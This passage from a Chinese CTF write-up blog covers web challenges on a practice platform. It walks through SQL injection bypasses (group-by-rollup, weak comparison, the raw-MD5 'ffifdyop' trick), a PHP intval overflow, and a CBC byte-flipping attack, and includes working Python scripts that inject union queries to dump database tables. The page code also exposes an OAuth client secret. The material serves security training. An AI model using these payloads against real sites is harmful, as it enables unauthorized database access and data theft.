</code></pre><p>注意过滤了这些关键字</p>
<pre><code>$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“;
</code></pre><p>要输出flag就要满足<code>mysql_num_rows($query) == 1、$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>这两个条件。</p>
<p>mysql_num_rows()函数返回结果集中行的数目。我们构造uname让sql语句查询出来的结果是一行就能绕过。Uname = ‘or 1 limit 1#，这样sql语句就是SELECT * FROM interest WHERE uname = ‘’or 1 limit 1#，这样就查询1行，也就能绕过第一个条件。<br>从源码分析可得，过滤了逗号，我们不能简单的使用limit 1,1这样的语法，而是可以使用limit 1 offset 1。</p>
<p>第二个条件是让查询的pwd的值等于输入的值，此处用的是 ==，根据弱类型，NULL和空字符串是相等的，然后就是绕过pwd了，<br>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p>
<p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2 （从第二行开始查询）#注释<br>此时密码只要为空即可查询成功</p>
<p>payload:uname=’or 1 group by pwd with rollup limit 1 OFFSET 2#</p>
<p>flag：CTF{with_rollup_interesting}</p>
<h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h3><p>自己没做出来<br>别人的wp三种方法：<br><a href="https://www.jianshu.com/p/5d34b3722128" target="_blank" rel="external">https://www.jianshu.com/p/5d34b3722128</a></p>
<h3 id="登录一下好吗？？"><a href="#登录一下好吗？？" class="headerlink" title="登录一下好吗？？"></a>登录一下好吗？？</h3><p>题目地址: <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a></p>
<p>在用户名表单里提交一系列字段可以发现题目过滤了几乎所有查询语句，注释，但是没有过滤’，这里的绕过比较巧妙，由于=是从左到到运算的，所以可以人为构造0=0的结果，payload为username=1’=’&amp;password=1’=’，拼接后的语句为:</p>
<pre><code>select * from user where username=&#39;1&#39;=&#39;&#39; and password=&#39;1&#39;=&#39;&#39;
</code></pre><p>username=’1’=’’这句，先有username=’1’返回0，然后再和’’比较，mysql中的弱类型比较0和空字符串是相等的，所以能返回1，后面半句同理，所以整句能够返回1，flag为ctf{51d1bf8fb65a8c2406513ee8f52283e7}。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011614_554.png" alt=""></p>
<h3 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="*你真的会PHP吗？"></a>*你真的会PHP吗？</h3><p>首先fiddler抓包，在response header中发现hint:6c525af4059b4fe7d8c33a.txt,打开后找到index.php源码<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201958_595.png" alt=""></p>
<pre><code>&lt;?php


$info = &quot;&quot;; 
$req = [];
$flag=&quot;xxxxxxxxxx&quot;;

ini_set(&quot;display_error&quot;, false); 
error_reporting(0); 


if(!isset($_POST[&#39;number&#39;])){
   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);

   die(&quot;have a fun!!&quot;); 
}

foreach([$_POST] as $global_var) { 
    foreach($global_var as $key =&gt; $value) { 
        $value = trim($value); 
        is_string($value) &amp;&amp; $req[$key] = addslashes($value); 
    } 
} 


function is_palindrome_number($number) { 
    $number = strval($number); 
    $i = 0; 
    $j = strlen($number) - 1; 
    while($i &lt; $j) { 
        if($number[$i] !== $number[$j]) { 
            return false; 
        } 
        $i++; 
        $j--; 
    } 
    return true; 
} 


if(is_numeric($_REQUEST[&#39;number&#39;])){

   $info=&quot;sorry, you cann&#39;t input a number!&quot;;

}elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))){

     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  

}else{

     $value1 = intval($req[&quot;number&quot;]);
     $value2 = intval(strrev($req[&quot;number&quot;]));  

     if($value1!=$value2){
          $info=&quot;no, this is not a palindrome number!&quot;;
     }else{

          if(is_palindrome_number($req[&quot;number&quot;])){
              $info = &quot;nice! {$value1} is a palindrome number!&quot;; 
          }else{
             $info=$flag;
          }
     }

}

echo $info;
</code></pre><p>经过审计我们可以发现如果我们要拿到flag，POST的number需要满足以下条件：<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等。即：</p>
<p>intval($req[“number”])=intval(strrev($req[“number”]))<br>1<br>回文数就是类似于121这样的数。从上面可以看出2，3条件似乎是冲突滴！</p>
<p>下面给出两种解法：</p>
<p>1.利用intval函数溢出绕过<br>Intval函数获取变量整数值。<br>函数介绍清点这里<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>
<p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件。通过把空字符可以绕过is_numeric的判断（如%00,%20）,所以我们构造以下poc，number=2147483647%00 和number=2147483647%20都可。</p>
<p>对于第一个条件，我们需要构造是让我们的poc被函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符和空字符。</p>
<p>而经过测试我发现is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！！<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803202002_274.png" alt=""></p>
<h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>首先代码审查</p>
<p>在查看页面源码中发现 代码泄露</p>
<pre><code>&lt;!-- $password=$_POST[&#39;password&#39;];
    $sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;
    $result=mysqli_query($link,$sql);
        if(mysqli_num_rows($result)&gt;0){
            echo &#39;flag is :&#39;.$flag;
        }
        else{
            echo &#39;密码错误!&#39;;
        } --&gt;
</code></pre><p>后台对传入的 password进行MD5加密后进行数据库 </p>
<p>想着怎么去构造一个MD5加密后的结果 在百度上搜了下<br>找到一个字符串  ffifdyop md5后，276f722736c95d99e921722cf9ed621c<br>再转成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code><br>那整个sql变成</p>
<pre><code>SELECT * FROM admin WHERE
username = &#39;admin&#39; and password = &#39;&#39;or&#39;6&lt;trash&gt;&#39;
</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011637_720.png" alt=""></p>
<h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>这题名字叫简单的登录题，实际上一点都不算简单，要认真写一个writeup确实很费劲，但pcat还是写了一篇过得去的。</p>
<p>1.做题的初步收集、整理<br>index.php是一个普通的登录框，输入id来登录，我们用burpsuite抓下包，并使用Repeater功能。<br>1) 当post id时候，返回包Set-cookie里包含iv和cipher，这2个英文单词玩密码学就很容易理解，iv就是Initialization Vector(初始化向量)，cipher就是密文</p>
<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011324_762.png" alt=""><br>注意这里有个提示：test.php<br>登录得到<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011334_838.png" alt=""><br>查看源码得到<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011335_302.png" alt=""><br>源码过滤|-|#|=|~|union|like|procedure这些语句</p>
<p>2) 使用Repeater功能不断的发送相同的包，返回的iv和cipher都不一样，基本断定每次的iv值是随机生成，另外iv和cipher的格式都是先base64编码后再进行urlencode编码。这里逻辑几句，不少人总看到base64解码后的字符是乱码后，就问该怎么解密之类的话，其实不要搞混了，base64不是一种加密方式，只是一种编码方式，base64编码后可以让不可视字符可视化（这才是最大的作用），而不起任何加密作用。<br>3) 把iv值经过urldecode再base64解码后用len()得到长度为16，基本猜测算法是aes，而且大胆猜测是aes的cbc模式<br>4) 从id=1入手，发现有#和-都会被waf检测到<br>5) 当cookies里有iv值和cipher值，然后不提交任何参数（包括id），就会显示Hello，猜测是根据传入的iv和cipher来解码后，再参与内部的sql查询出用户名<br>6) 由于aes的key值不知道，我就觉得这题比较难做了，然后先按照web题的基本思路———扫描，打开御剑扫一下，幸运的发现test.php泄露了源码。整理下源码中的逻辑：<br> <em>1 若是post id，就先进行waf检测，检测过了才随机生成iv值，并且对array(‘id’=&gt;$id)进行php的序列化操作，再进行aes加密，再分别对iv和cipher进行base64编码并设置到cookies
 </em>2 如果cookies里有iv和cipher，就对其base64解码，然后对其aes解密，再进行php反序列化，如果不能反序列化则返回解密后的明文的base64编码，如果可以则进行sql语句拼接，查询若是行数&gt;0就显示其username列的值，否则都是Hello!<br> <em>3 难点1，过滤了#-=,还有union和procedure
 </em>4 难点2，注入点在limit后面，而且后面还是”,0”，0本来就是让limit取出0行，而前面的逗号更是难弄掉<br> *5 aes的加密模式aes-128-cbc<br>7) mysql语法，limit后面只能procedure还有for update，还有尝试了堆叠注入，也是不行。<br>8) 本题算比较好点，mysql会显示错误信息，这就可以弄报错注入（当前是得有前提的）</p>
<p>2.构建能绕过过滤的payload<br>尝试了很多，发现post id=1;%00（这里关键是;%00）可以绕过去，然后登录后会显示Hello!rootzz，说明user表里的值是rootzz，而并不是我们所期待的flag值（如果那么简单就好了- -）<br>关键的关键字都被过滤，这可怎么办？<br>这时候要冷静分析下。<br>1) 直接post id时候是有过滤<br>2) 在cookies解密出来是没有过滤，就直接拼接sql语句<br>于是我们可以大胆猜测，修改cookies的值来达到解密后的明文可以构造sql注入。</p>
<p>这并不是无的放矢，在密码学里是可以做到的</p>
<p>3.aes的cbc byte flipping attack（cbc字节翻转攻击）<br>先放出参考文章，自己可以多去阅读<br>推荐英文文章：<br><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/" target="_blank" rel="external">http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/</a><br>以下是中文译文（其中图片挂了，结合英文版就没问题）：</p>
<pre><code>http://wps2015.org/drops/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html
=======
</code></pre><p>cbc字节翻转攻击，我就不叙述原理，我直接演示一个简单的操作：<br>把id=12的密文修改后解析为id=1#</p>
<p>这里因为序列化是php的，我先写了一个php文件，便于显示</p>
<pre><code>&lt;?php
$id=@$_POST[&#39;id&#39;];
$info = array(&#39;id&#39;=&gt;$id);
$plain = serialize($info);
$row=ceil(strlen($plain)/16);
for($i=0;$i&lt;$row;$i++){
    echo substr($plain,$i*16,16).&#39;&lt;br/&gt;&#39;;
}
</code></pre><p>当post id=12时候，显示<br>a:1:{s:2:”id”;s:<br>2:”12”;}<br>每一行16个字节，这里12的2对应上一行{的偏离量是4<br>有这个准备后，<br>在原题里post id=12，得到下面（这只是示例）<br>iv=ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D<br>cipher=U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D</p>
<p>运行以下脚本</p>
<pre><code># -*- coding:utf8 -*-
__author__=&#39;pcat@chamd5.org&#39;
from base64 import *
import urllib
cipher=&#39;U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D&#39;
cipher_raw=b64decode(urllib.unquote(cipher))
lst=list(cipher_raw)
idx=4
c1=&#39;2&#39;
c2=&#39;#&#39;
lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))
cipher_new=&#39;&#39;.join(lst)
cipher_new=urllib.quote(b64encode(cipher_new))
print cipher_new
</code></pre><p>得到cipher_new<br>U9qq55BOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D<br>再用之前的iv一起去访问，得到<br>base64_decode(‘g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9’) can’t unserialize<br>这是因为iv值没修改，导致无法反序列化</p>
<p>运行以下脚本</p>
<pre><code># -*- coding:utf8 -*-
__author__=&#39;pcat@chamd5.org&#39;
from base64 import *
import urllib
iv=&#39;ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D&#39;
iv_raw=b64decode(urllib.unquote(iv))
first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;
plain=b64decode(&#39;g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9&#39;)
iv_new=&#39;&#39;
for i in range(16):
    iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))
iv_new=urllib.quote(b64encode(iv_new))
print iv_new
</code></pre><p>得到iv_new<br>hHlJ4xkEBvpldXUI0wqnNA%3D%3D<br>再跟之前的cipher_new，一起去访问，得到<br>Hello!rootzz<br>也就是id=12顺利变成了id=1#注入成功。</p>
<p>离成功就差一步了，<br>1) 把上面的过程编写成脚本<br>2) 尽可能只翻转一个字节，例如把2nion翻转为union，末尾再用;%00来注释掉后面<br>3) 由于逗号被过滤，用join来代替；等号被过滤，用regexp来代替</p>
<p>以下是pcat的脚本：</p>
<pre><code># -*- coding:utf8 -*-
# 请保留我的个人信息，谢谢~！
__author__=&#39;pcat@chamd5.org&#39;

from base64 import *
import urllib
import requests
import re

def mydecode(value):
    return b64decode(urllib.unquote(value))

def myencode(value):
    return urllib.quote(b64encode(value))

def mycbc(value,idx,c1,c2):
    lst=list(value)
    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))
    return &#39;&#39;.join(lst)

def pcat(payload,idx,c1,c2):
    url=r&#39;http://ctf5.shiyanbar.com/web/jiandan/index.php&#39;
    myd={&#39;id&#39;:payload}
    res=requests.post(url,data=myd)
    cookies=res.headers[&#39;Set-Cookie&#39;]

    iv=re.findall(r&#39;iv=(.*?),&#39;,cookies)[0]
    cipher=re.findall(r&#39;cipher=(.*)&#39;,cookies)[0]

    iv_raw=mydecode(iv)
    cipher_raw=mydecode(cipher)

    cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))
    cookies_new={&#39;iv&#39;:iv,&#39;cipher&#39;:cipher_new}
    cont=requests.get(url,cookies=cookies_new).content
    plain=b64decode(re.findall(r&quot;base64_decode\(&#39;(.*?)&#39;\)&quot;,cont)[0])

    first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;
    iv_new=&#39;&#39;
    for i in range(16):
        iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))
    iv_new=myencode(iv_new)

    cookies_new={&#39;iv&#39;:iv_new,&#39;cipher&#39;:cipher_new}
    cont=requests.get(url,cookies=cookies_new).content
    print &#39;Payload:%s\n&gt;&gt; &#39; %(payload)
    print cont
    pass


def foo():
    pcat(&#39;12&#39;,4,&#39;2&#39;,&#39;#&#39;)
    pcat(&#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&#39;+chr(0),6,&#39;2&#39;,&#39;u&#39;)
    pcat(&#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&#39;+chr(0),7,&#39;2&#39;,&#39;u&#39;)
    pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &#39;you_want&#39;)b join (select 3)c);&quot;+chr(0),7,&#39;2&#39;,&#39;u&#39;)
    pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&#39;2&#39;,&#39;u&#39;)
    pass

if __name__ == &#39;__main__&#39;:
    foo()
    print &#39;ok&#39;
</code></pre>
      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 72382781@qq.com </span>
    </div>
</article>


<p>
    <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
</p>


<div class="article_copyright">
    <p><span>文章标题:</span>实验吧web—writeup</p>
    <p><span>文章字数:</span><span class="post-count">6,763</span></p>
    <p><span>本文作者:</span><a href="javascript:void(0)" title="Bigbroke">Bigbroke</a></p>
    <p><span>发布时间:</span>2018-04-02, 16:10:18</p>
    <p><span>最后更新:</span>2018-11-02, 21:52:17</p>
    <span>原始链接:</span><a class="post-url" href="/archis/79216fa/" title="实验吧web—writeup">http://Bigbroke.com/archis/79216fa/</a>
    <p>
        <span>版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>


    <div id="comments"></div>
<link rel="stylesheet" href="/css/gitalk.css">

<script type="text/javascript">
    $.getScript('/js/gitalk.js', function () {
        var gitalk = new Gitalk({
            clientID: 'eb679ffbe3e667bef087',
            clientSecret: '803d24db3cf86013b1c74778931b9e6670081459',
            repo: 'bigbroke.github.io',
            owner: 'bigbroke',
            admin: ['bigbroke'],
            id: location.pathname,
            distractionFreeMode: 'true',
            language: 'zh-CN',
            perPage: parseInt('10',10)
        })
        gitalk.render('comments')
    })
</script>



    

    </div>
    <div class="copyright">
        <p class="footer-entry">©2018 Bigbroke</p>
<p class="footer-entry">Buit with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" href="javascript:void(0)"></a>
    </div>
</div>
<div class="acParent"></div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
    <div class="shang_tit">
        <p>喜欢就点赞,疼爱就打赏</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
    </div>
</div>

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"position":"right","width":90,"height":150},"mobile":{"show":true},"log":false});</script></body>
<script src="//cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>

<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe-ui-default.min.js"></script>

<script src="/js/script.js"></script>
<script>
    var img_resize = 'photoSwipe';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#思考','#life','#正则','#WP','#first-blog','#ctf','#代码审计','#sqlilabs','#sqlmap','#cve','#VIM','#Nmap','#密码学','#hexo','#Nikto','#TCPDUMP','#QWASP_ZAP','#NETCAT','#docker','#Skipfish','#Vega','#复现','#文件包含','#读书摘要','#信息收集','#Web漏洞','#内网','#CTF','#文件上传','#渗透','#web','#黑客攻防web安全实战详解','#入侵','#Dvwa',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().split('\n').length - 1;
            var $numbering = $('<ul/>').addClass('pre-numbering').attr("unselectable","on");
            $(this).addClass('has-numbering')
                    .parent()
                    .append($numbering);
            for(i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info//busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        

        // PhotoSwipe
        $('article').each(function(i){
            $(this).find('img').each(function(){
                if ($(this).closest('figure').hasClass('article-gallery-img')) {
                    return;
                }
                var alt = this.alt;
                $(this)
                    .wrap('<figure class="article-gallery-img" itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject"></figure>')
                    .wrap('<a href="' + this.src + '" title="' + alt + '"></a>');
                $(this).after('<div class="img_alt"><span>' + (alt || '') + '</span></div>');
            });
        });

        var pswpElement = document.querySelectorAll('.pswp')[0];
        if (pswpElement) {
            var gallerySelector = '.article-gallery, article';

            var initPhotoSwipeFromDOM = function(gallerySelector) {

                // parse slide data (url, title, size ...) from DOM elements
                // (children of gallerySelector)
                var parseThumbnailElements = function(el) {
                    var thumbElements = $(el).find('figure.article-gallery-img').toArray(),
                        numNodes = thumbElements.length,
                        items = [],
                        figureEl,
                        linkEl,
                        size,
                        imgEl,
                        item;

                    for (var i = 0; i < numNodes; i++) {

                        figureEl = thumbElements[i]; // <figure> element

                        // include only element nodes
                        if (figureEl.nodeType !== 1) {
                            continue;
                        }

                        linkEl = figureEl.children[0]; // <a> element
                        imgEl = linkEl.children[0]; // <img>

                        size = linkEl.getAttribute('data-size');
                        size = size && size.split('x');

                        // create slide object
                        item = {
                            src: linkEl.getAttribute('href'),
                            w: size && parseInt(size[0], 10) || imgEl.width,
                            h: size && parseInt(size[1], 10) || imgEl.height
                        };

                        if (figureEl.children.length > 1) {
                            // <figcaption> content
                            item.title = figureEl.children[1].innerHTML;
                        }

                        if (linkEl.children.length > 0) {
                            // <img> thumbnail element, retrieving thumbnail url
                            item.msrc = linkEl.children[0].getAttribute('src');
                        }

                        item.el = figureEl; // save link to element for getThumbBoundsFn
                        items.push(item);
                    }

                    return items;
                };

                // find nearest parent element
                var closest = function closest(el, fn) {
                    return el && (fn(el) ? el : closest(el.parentNode, fn));
                };

                // triggers when user clicks on thumbnail
                var onThumbnailsClick = function(e) {
                    e = e || window.event;

                    var eTarget = e.target || e.srcElement;

                    // find root element of slide
                    var clickedListItem = closest(eTarget, function(el) {
                        return (el.tagName && el.tagName.toUpperCase() === 'FIGURE');
                    });

                    if (!clickedListItem) {
                        return;
                    }

                    if (e.preventDefault) {
                        e.preventDefault();
                    } else {
                        e.returnValue = false;
                    }

                    // find index of clicked item by looping through all child nodes
                    // alternatively, you may define index via data- attribute
                    var clickedGallery = $(clickedListItem).closest(gallerySelector)[0],
                        childNodes = $(clickedGallery).find('figure.article-gallery-img').toArray(),
                        numChildNodes = childNodes.length,
                        nodeIndex = 0,
                        index;

                    for (var i = 0; i < numChildNodes; i++) {
                        if (childNodes[i].nodeType !== 1) {
                            continue;
                        }

                        if (childNodes[i] === clickedListItem) {
                            index = nodeIndex;
                            break;
                        }
                        nodeIndex++;
                    }



                    if (index >= 0) {
                        // open PhotoSwipe if valid index found
                        openPhotoSwipe(index, clickedGallery);
                    }
                    return false;
                };

                // parse picture index and gallery index from URL (#&pid=1&gid=2)
                var photoswipeParseHash = function() {
                    var hash = window.location.hash.substring(1),
                        params = {};

                    if (hash.length < 5) {
                        return params;
                    }

                    var vars = hash.split('&');
                    for (var i = 0; i < vars.length; i++) {
                        if (!vars[i]) {
                            continue;
                        }
                        var pair = vars[i].split('=');
                        if (pair.length < 2) {
                            continue;
                        }
                        params[pair[0]] = pair[1];
                    }

                    if (params.gid) {
                        params.gid = parseInt(params.gid, 10);
                    }

                    return params;
                };

                var openPhotoSwipe = function(index, galleryElement, disableAnimation, fromURL) {
                    var pswpElement = document.querySelectorAll('.pswp')[0],
                        gallery,
                        options,
                        items;

                    items = parseThumbnailElements(galleryElement);

                    // define options (if needed)
                    options = {

                        // define gallery index (for URL)
                        galleryUID: galleryElement.getAttribute('data-pswp-uid'),

                        getThumbBoundsFn: function(index) {
                            // See Options -> getThumbBoundsFn section of documentation for more info
                            var thumbnail = items[index].el.getElementsByTagName('img')[0], // find thumbnail
                                pageYScroll = window.pageYOffset || document.documentElement.scrollTop,
                                rect = thumbnail.getBoundingClientRect();

                            return {
                                x: rect.left,
                                y: rect.top + pageYScroll,
                                w: rect.width
                            };
                        }
                    };

                    // PhotoSwipe opened from URL
                    if (fromURL) {
                        if (options.galleryPIDs) {
                            // parse real index when custom PIDs are used
                            // http://photoswipe.com/documentation/faq.html#custom-pid-in-url
                            for (var j = 0; j < items.length; j++) {
                                if (items[j].pid == index) {
                                    options.index = j;
                                    break;
                                }
                            }
                        } else {
                            // in URL indexes start from 1
                            options.index = parseInt(index, 10) - 1;
                        }
                    } else {
                        options.index = parseInt(index, 10);
                    }

                    // exit if index not found
                    if (isNaN(options.index)) {
                        return;
                    }

                    if (disableAnimation) {
                        options.showAnimationDuration = 0;
                    }

                    // Pass data to PhotoSwipe and initialize it
                    gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);

                    gallery.listen('imageLoadComplete', function(index, item) {
                        var linkEl = item.el.children[0];
                        var img = item.container.children[0];
                        if (!linkEl.getAttribute('data-size')) {
                            linkEl.setAttribute('data-size', img.naturalWidth + 'x' + img.naturalHeight);
                            item.w = img.naturalWidth;
                            item.h = img.naturalHeight;
                            gallery.invalidateCurrItems();
                            gallery.updateSize(true);
                        }
                    });

                    gallery.init();
                };

                // loop through all gallery elements and bind events
                var galleryElements = document.querySelectorAll(gallerySelector);

                for (var i = 0, l = galleryElements.length; i < l; i++) {
                    galleryElements[i].setAttribute('data-pswp-uid', i + 1);
                    galleryElements[i].onclick = onThumbnailsClick;
                }

                // Parse URL and open gallery if it contains #&pid=3&gid=1
                var hashData = photoswipeParseHash();
                if (hashData.pid && hashData.gid) {
                    openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true);
                }
            };

            // execute above function
            initPhotoSwipeFromDOM(gallerySelector);
        }
        
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 2px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
</style>

<!--自定义样式设置-->
<style>
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 2px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /*引用块样式*/
    
    .post .pjax article blockquote {
        padding: 10px 20px;
        background-color: white;
        border: none;
        border-left: 4px solid #42b983;
        border-right: 4px solid #42b983;
        border-radius: 10px;
    }
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.1;
        background: url("http://oy0tigw51.bkt.clouddn.com/201711210136_683.png");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    
</style>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe.
         It's a separate element, as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. PhotoSwipe keeps only 3 slides in DOM to save memory. -->
        <!-- don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

